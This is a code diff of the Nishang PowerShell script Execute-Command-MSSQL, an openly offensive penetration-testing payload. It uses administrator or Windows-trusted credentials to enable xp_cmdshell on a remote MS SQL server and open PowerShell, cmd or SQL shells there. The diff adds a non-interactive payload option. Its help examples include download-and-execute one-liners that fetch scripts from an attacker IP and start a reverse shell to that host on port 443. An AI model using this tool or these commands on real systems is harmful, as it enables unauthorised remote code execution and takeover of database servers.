@@ -1,3 +1,4 @@
+  function Execute-Command-MSSQL {
 <#
 .SYNOPSIS
 Nishang payload which could be used to execute commands remotely on a MS SQL server.
@@ -5,7 +6,8 @@ Nishang payload which could be used to execute commands remotely on a MS SQL ser
 .DESCRIPTION
 This payload needs a valid administrator username and password on remote SQL server.
 It uses the credentials to enable xp_cmdshell and provides a powershell shell, a sql shell
-or a cmd shell on the target.
+or a cmd shell on the target. If the WindowsAuthentication switch is used, an attempt is made to 
+use the Windows Authentication. No username and password is required in such case.
 
 .PARAMETER ComputerName
 Enter CopmuterName or IP Address of the target SQL server.
@@ -16,15 +18,32 @@ Enter a UserName for a SQL server administrator account.
 .PARAMETER Password
 Enter the Password for the account.
 
-.EXAMPLE
-PS> .\Execute-Command-MSSQL.ps1 -ComputerName sqlserv01 -UserName sa -Password sa1234
+.PARAMETER WindowsAuthentication
+Use this switch parameter to use Windows Authentication for SQL Server.
 
 .EXAMPLE
-PS> .\Execute-Command-MSSQL.ps1 -ComputerName 192.168.1.10 -UserName sa -Password sa1234
+PS> Execute-Command-MSSQL -ComputerName sqlserv01 -UserName sa -Password sa1234
+
+.EXAMPLE
+PS> Execute-Command-MSSQL -ComputerName 192.168.1.10 -UserName sa -Password sa1234
+
+.EXAMPLE
+PS> Execute-Command-MSSQL -ComputerName target -UserName sa -Password sa1234
+Connecting to target...
+Enabling XP_CMDSHELL...
+Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): P
+Starting PowerShell on the target..
+PS target> iex ((New-Object Net.Webclient).downloadstring(''http://192.168.254.1/Get-Information.ps1''));Get-Information
+
+Use above to execute scripts on a target.
+
+.EXAMPLE
+PS> Execute-Command-MSSQL -ComputerName target -UserName sa -Password sa1234 -payload "iex ((New-Object Net.Webclient).downloadstring(''http://192.168.254.1/Invoke-PowerShellTcp.ps1''));Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.1 -Port 443"
+Use above to execute scripts on a target non-interactively.
 
 .LINK
-http://labofapenetrationtester.blogspot.com/
-http://code.google.com/p/nishang
+http://www.labofapenetrationtester.com/2012/12/command-execution-on-ms-sql-server-using-powershell.html
+https://github.com/samratashok/nishang
 
 .NOTES
 Based mostly on the Get-TSSqlSysLogin by Niklas Goude and accompanying blog post at 
@@ -33,69 +52,63 @@ http://www.truesec.com
 
 #>
 
+    [CmdletBinding()] Param(
+        [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
+        [Alias("PSComputerName","CN","MachineName","IP","IPAddress")]
+        [string]
+        $ComputerName,
 
+        [parameter(Mandatory = $False, Position = 1)]
+        [string]
+        $UserName,
+    
+        [parameter(Mandatory = $False, Position = 2)]
+        [string]
+        $Password,
 
-  Param(
-    [Parameter(Mandatory = $true, Position = 0, ValueFromPipeLine= $true)]
-    [Alias("PSComputerName","CN","MachineName","IP","IPAddress")][string]$ComputerName,
-    [parameter(Mandatory = $true, Position = 1)][string]$UserName,
-    [parameter(Mandatory = $true, Position = 2)][string]$Password
+        [parameter(Mandatory = $False, Position = 3)]
+        [string]
+        $payload,
+                
+        [parameter()]
+        [switch]
+        $WindowsAuthentication
     )
   
-  function Execute-Command-MSSQL {
-  
-  Try{
-    function Make-Connection ($query){
- 
-    $Connection = New-Object System.Data.SQLClient.SQLConnection
-    $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
-    $Connection.Open()
-    $Command = New-Object System.Data.SQLClient.SQLCommand
-    $Command.Connection = $Connection
-    $Command.CommandText = $query
-    $Reader = $Command.ExecuteReader()
-    $Connection.Close()
-
-    }
-  
-    "Connecting to $ComputerName..." 
-	start-sleep 3 
-    Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
-    "`nEnabling XP_CMDSHELL...`n"
-    start-sleep 3
-    Make-Connection "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
-    write-host -NoNewline "Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): "
-    $shell = read-host
-    while($payload -ne "exit")
+    Try{
+    function Make-Connection ($query)
     {
         $Connection = New-Object System.Data.SQLClient.SQLConnection
         $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
+        if ($WindowsAuthentication -eq $True)
+        {
+            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
+        }
         $Connection.Open()
         $Command = New-Object System.Data.SQLClient.SQLCommand
         $Command.Connection = $Connection
-        if ($shell -eq "P")
+        $Command.CommandText = $query
+        $Reader = $Command.ExecuteReader()
+        $Connection.Close()
+    }
+  
+    "Connecting to $ComputerName..." 
+    Make-Connection "EXEC sp_configure 'show advanced options',1; RECONFIGURE;"
+    "`nEnabling XP_CMDSHELL...`n"
+    Make-Connection "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE"
+
+    if ($payload)
+    {
+        $Connection = New-Object System.Data.SQLClient.SQLConnection
+        $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
+        if ($WindowsAuthentication -eq $True)
         {
-            write-host "`n`nStarting PowerShell on the target..`n"
-            write-host -NoNewline "PS $ComputerName> "
-            $payload = read-host
-            $cmd = "EXEC xp_cmdshell 'powershell.exe -Command `"& {$payload}`"'"
+            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
         }
-        elseif ($shell -eq "S")
-        {
-            write-host "`n`nStarting SQL shell on the target..`n"
-            write-host -NoNewline "MSSQL $ComputerName> "
-            $payload = read-host
-            $cmd = $payload
-        }
-        elseif ($shell -eq "C")
-        {
-            write-host "`n`nStarting cmd shell on the target..`n"
-            write-host -NoNewline "CMD $ComputerName> "
-            $payload = read-host
-            $cmd = "EXEC xp_cmdshell 'cmd.exe /K $payload'"
-        }
-            
-            
+        $Connection.Open()
+        $Command = New-Object System.Data.SQLClient.SQLCommand
+        $Command.Connection = $Connection
+        $cmd = "EXEC xp_cmdshell 'powershell.exe $payload'"
         $Command.CommandText = "$cmd"
         $Reader = $Command.ExecuteReader()
         while ($reader.Read()) {
@@ -105,10 +118,60 @@ http://www.truesec.com
         }
         $Connection.Close()
     }
-    }
-    Catch {
-      $error[0]
+
+    else
+    {
+        write-host -NoNewline "Do you want a PowerShell shell (P) or a SQL Shell (S) or a cmd shell (C): "
+        $shell = read-host
+        while($payload -ne "exit")
+        {
+            $Connection = New-Object System.Data.SQLClient.SQLConnection
+            $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;User Id=$userName;Password=$password;"
+            if ($WindowsAuthentication -eq $True)
+            {
+                $Connection.ConnectionString = "Data Source=$ComputerName;Initial Catalog=Master;Trusted_Connection=Yes;"
+            }
+            $Connection.Open()
+            $Command = New-Object System.Data.SQLClient.SQLCommand
+            $Command.Connection = $Connection
+            if ($shell -eq "P")
+            {
+                write-host "`n`nStarting PowerShell on the target..`n"
+                write-host -NoNewline "PS $ComputerName> "
+                $payload = read-host
+                $cmd = "EXEC xp_cmdshell 'powershell.exe -Command $payload'"
+            }
+            elseif ($shell -eq "S")
+            {
+                write-host "`n`nStarting SQL shell on the target..`n"
+                write-host -NoNewline "MSSQL $ComputerName> "
+                $payload = read-host
+                $cmd = $payload
+            }
+            elseif ($shell -eq "C")
+            {
+                write-host "`n`nStarting cmd shell on the target..`n"
+                write-host -NoNewline "CMD $ComputerName> "
+                $payload = read-host
+                $cmd = "EXEC xp_cmdshell 'cmd.exe /K $payload'"
+            }
+            
+            
+            $Command.CommandText = "$cmd"
+            $Reader = $Command.ExecuteReader()
+            while ($reader.Read()) {
+                New-Object PSObject -Property @{
+                Name = $reader.GetValue(0)
+                }
+            }
+            $Connection.Close()
+        }
+    }    
+    
+    }Catch {
+        $error[0]
     }
 }
 
-Execute-Command-MSSQL
+
+
